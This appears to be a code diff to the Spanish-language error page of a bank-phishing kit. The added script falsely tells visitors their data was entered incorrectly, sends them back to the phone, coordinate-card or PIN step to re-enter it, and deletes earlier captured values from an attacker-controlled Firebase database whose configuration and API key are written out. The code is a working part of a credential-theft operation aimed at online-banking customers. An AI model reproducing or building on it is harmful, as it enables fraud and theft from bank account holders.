@@ -2,24 +2,68 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="UTF-8" />
   <title>Error</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #fff;
-      color: #dc3545;
+      background-color: white;
+      color: red;
       text-align: center;
-      padding: 5rem 2rem;
+      padding-top: 100px;
+      font-size: 22px;
     }
-
-    h1 {
-      font-size: 24px;
+    button {
+      margin-top: 40px;
+      padding: 12px 20px;
+      font-size: 16px;
     }
   </style>
 </head>
 <body>
-  <h1>Coordenadas Incorrectas</h1>
+  <div>Datos ingresados Incorrectamente!</div>
+  <button onclick="volver()">Volver</button>
+
+  <script>
+    const paso = sessionStorage.getItem("ultimoPaso");
+    function volver() {
+      if (paso === "telefono") {
+        window.location.href = "telefono.html";
+      } else if (paso === "coordenadas") {
+        window.location.href = "coordenadas.html";
+      } else if (paso === "clave3") {
+        window.location.href = "clave3.html";
+      } else {
+        window.location.href = "index.html";
+      }
+    }
+  </script>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
+    authDomain: "formulario-officebanking.firebaseapp.com",
+    databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
+    projectId: "formulario-officebanking",
+    storageBucket: "formulario-officebanking.appspot.com",
+    messagingSenderId: "604053438195",
+    appId: "1:604053438195:web:188de91bee9a62f0d3c186"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  const paso = sessionStorage.getItem("ultimoPaso");
+  const clave = sessionStorage.getItem("clave_registro");
+
+  if (clave && (paso === "coordenadas" || paso === "clave3")) {
+    const campos = paso === "coordenadas"
+      ? ["coordenada1", "coordenada2", "coordenada3"]
+      : ["clave30"];
+    campos.forEach(c => db.ref("registros/" + clave + "/" + c).remove());
+  }
+</script>
+
 </body>
 </html>
